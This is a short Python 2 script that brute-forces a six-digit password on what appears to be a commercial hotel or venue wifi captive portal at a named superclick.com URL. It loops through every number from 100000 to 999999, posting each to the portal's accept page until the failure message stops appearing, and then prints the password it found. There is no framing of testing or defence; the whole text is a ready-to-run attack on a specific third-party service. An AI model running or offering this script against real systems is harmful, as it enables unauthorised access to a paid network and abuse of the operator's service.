import urllib2


print "now trying all passwords, this might take up to 10 minutes or even longer, hang in there!"
pw = 0
for i in range(100000, 999999):
	a = urllib2.urlopen("https://p1232.superclick.com/superclick/wifi_accept.php", "yesval=yes&noval=no&button=yes&password="+str(i))
	if not "please go back and try again." in a.read():
		pw = i
		break
print "password is" + str(pw)
